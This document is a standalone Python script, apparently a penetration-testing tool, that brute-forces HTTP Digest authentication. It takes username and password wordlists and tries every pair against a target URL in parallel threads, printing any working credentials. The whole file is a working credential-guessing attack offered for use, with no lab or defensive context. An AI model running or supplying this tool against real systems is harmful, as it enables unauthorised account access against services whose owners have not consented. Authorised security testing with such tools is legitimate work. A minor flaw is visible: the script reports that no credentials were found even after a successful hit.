import requests
from requests.auth import HTTPDigestAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys
import signal

# Graceful exit flag
exit_requested = False

def signal_handler(sig, frame):
    global exit_requested
    print("\n[!] CTRL+C detected. Exiting gracefully...")
    exit_requested = True

# Register signal handler
signal.signal(signal.SIGINT, signal_handler)

def try_login(username, password, target_url):
    if exit_requested:
        return None
    try:
        response = requests.get(target_url, auth=HTTPDigestAuth(username, password), timeout=5)
        if response.status_code == 200:
            print(f"[+] SUCCESS: {username}:{password}")
            return (username, password)
        else:
            print(f"[-] FAILED: {username}:{password} ({response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: {username}:{password} - {e}")
    return None

def main():
    parser = argparse.ArgumentParser(description="Digest Auth Brute-Force Script")
    parser.add_argument("-u", "--userlist", required=True, help="Path to username wordlist")
    parser.add_argument("-p", "--passlist", required=True, help="Path to password wordlist")
    parser.add_argument("-t", "--target", required=True, help="Target URL with Digest Authentication")
    parser.add_argument("-th", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    args = parser.parse_args()

    try:
        with open(args.userlist, 'r', encoding='utf-8', errors='ignore') as ufile:
            usernames = [u.strip() for u in ufile if u.strip()]
        with open(args.passlist, 'r', encoding='utf-8', errors='ignore') as pfile:
            passwords = [p.strip() for p in pfile if p.strip()]
    except Exception as e:
        print(f"[!] Failed to read wordlists: {e}")
        sys.exit(1)

    print(f"[+] Starting brute-force on {args.target} with {len(usernames)} usernames and {len(passwords)} passwords...")

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(try_login, u, p, args.target): (u, p)
                       for u in usernames for p in passwords}

            for future in as_completed(futures):
                if exit_requested:
                    break
                result = future.result()
                if result:
                    print(f"\n[!] VALID CREDENTIALS FOUND: {result[0]}:{result[1]}")
                    executor.shutdown(wait=False)
                    sys.exit(0)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    finally:
        print("\n[-] No valid credentials found or process aborted.")

if __name__ == "__main__":
    main()
